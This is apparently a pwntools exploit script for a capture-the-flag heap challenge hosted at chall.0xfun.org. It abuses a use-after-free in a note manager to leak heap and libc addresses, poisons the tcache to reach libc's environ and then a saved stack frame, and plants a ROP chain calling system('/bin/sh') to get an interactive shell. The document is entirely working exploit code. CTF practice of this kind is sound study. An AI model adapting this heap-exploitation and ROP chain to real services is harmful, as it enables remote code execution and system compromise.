#!/usr/bin/env python3
from pwn import *

exe = ELF("./chall")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")
context.binary = exe

gs = """ b main """
def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gs)
    else:
        r = remote("chall.0xfun.org", 31618)

    return r


def create(idx, size, data=b'A'):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Index: ', str(idx).encode())
    p.sendlineafter(b'Size: ', str(size).encode())
    p.sendafter(b'Data: ', data)
    p.recvuntil(b'Note created!')

def delete(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'Index: ', str(idx).encode())
    p.recvuntil(b'Note deleted!')

def read_note(idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'Index: ', str(idx).encode())
    p.recvuntil(b'Data: ')

def edit(idx, data):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'Index: ', str(idx).encode())
    p.sendafter(b'New Data: ', data)
    p.recvuntil(b'Note updated!')

def mangle(target, heap_key):
    return target ^ heap_key

p = conn()

for i in range(8):
    create(i, 0x80, b'X' * 0x80)
create(8, 0x20, b'G' * 0x20)

delete(0)
read_note(0)
heap_key = u64(p.recvn(8))
heap_base = heap_key << 12
log.success(f"Heap base: {hex(heap_base)}")

for i in range(1, 7):
    delete(i)
delete(7)

read_note(7)
unsorted_fd = u64(p.recvn(8))
log.info(f"Unsorted bin fd (main_arena+0x60): {hex(unsorted_fd)}")
libc.address = unsorted_fd - 0x1e7ba0
log.success(f"Libc base: {hex(libc.address)}")

environ_target = libc.address + 0x1eee28 - 0x18
log.info(f"Environ target (environ-0x18): {hex(environ_target)}")

create(0, 0x90, b'A' * 0x90)
create(1, 0x90, b'B' * 0x90)
delete(1)
delete(0)

mangled_env = mangle(environ_target, heap_key)
edit(0, p64(mangled_env))
create(2, 0x90, b'C' * 0x90)
create(3, 0x90, b'A' * 0x18)

read_note(3)
raw = p.recvn(0x90)
environ_value = u64(raw[0x18:0x20])
log.success(f"Stack (environ): {hex(environ_value)}")   

stack_target = environ_value - 0x150 - 0x8
log.info(f"Stack target (create_note saved RBP): {hex(stack_target)}")

ret      = libc.address + 0x10437e
pop_rdi  = libc.address + 0x102dea
binsh    = libc.address + 0x1afea4
system   = libc.address + 0x53ac0
log.info(f'Gadgets: ret={hex(ret)} pop_rdi={hex(pop_rdi)} binsh={hex(binsh)} system={hex(system)}')

rop_chain  = p64(0)
rop_chain += p64(ret)
rop_chain += p64(pop_rdi)
rop_chain += p64(binsh)
rop_chain += p64(system)

log.info(f"ROP: ret={hex(ret)} pop_rdi={hex(pop_rdi)} binsh={hex(binsh)} system={hex(system)}")

create(4, 0xa0, b'D' * 0xa0)
create(5, 0xa0, b'E' * 0xa0)
delete(5)
delete(4)
mangled_stack = mangle(stack_target, heap_key)
edit(4, p64(mangled_stack))

create(6, 0xa0, b'F' * 0xa0)

log.info("Sending ROP chain to stack...")
create(7, 0xa0, rop_chain)

p.interactive()